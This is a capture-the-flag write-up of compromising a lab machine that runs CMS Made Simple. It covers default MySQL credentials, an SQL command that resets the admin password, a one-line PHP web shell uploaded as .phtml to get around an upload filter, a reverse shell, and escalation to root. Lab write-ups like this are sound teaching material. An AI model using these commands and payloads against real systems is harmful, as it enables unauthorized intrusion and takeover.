My-CMSMS

Target IP: 192.168.186.74

Scanning


There are four TCP ports open on the target machine.

Enumeration

Port 80: HTTP

The webpage above is displayed for the application on port 80. Doing a source-code review shows the application's version is 2.2.13.


Performing a directory search leads to interesting results shown above. Going through each directory did not provide me anything useful other than /phpinfo.php.

Port 3306: MySQL

Looks like default credentials are used for this application. I gained access by using root:root.


There is an interesting database called cmsms_db. This database contains a table called cms_users which contains only one entry as shown above.


There is also another interesting table called cms_adminlog which contains the logged data of the user admin actions.Looks like two files have been uploaded? Maybe we can browse to them? Maybe this will come handy later if I can upload files to gain a remote connection to my local machine.

Exploitation


I successfully updated the password of the user admin to admin by using the command update cms_users set password=(select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name='sitemask'),''),'admin'))) where username='admin';. Now I should be able to login to the CMS application using this new password.


And now I am able to login with the new password.


The File Manager is interesting as it allows us to upload files to the target machine. From previous enumeration, I know that the host has PHP installed and uploaded items are stored in /uploads/images directory (according to the log file found in MySQL). There is a filtering in place to prevent .php being uploaded.



However, I noticed .phtml PHP extension is not filtered as I was able to upload this extension type. I created a simple web shell script with the code <?php echo system($_GET['cmd']); ?> and named it as webshell.phtml. After uploading it, I was able to use it! Time to upload PHP Pentest Monkey reverse shell and gain a reverse shell connection from the target host!


The new PHP Pentest Monkey reverse shell script with the name shell.phtml.

After uploading the shell script, I browsed to http://192.168.186.74/uploads/images/shell.phtml to activate it! Now I have a foothold on the machine!

Privilege Escalation


There is an interesting password inside the .htpasswd file. It is in base64 format. I had to decode that string again to get base32. Then I received the credential armour:Shield@123.


I switched user to armour using the new password and it worked.


Looks like we can take advantage of python to gain a root shell.


And now I have a root shell.
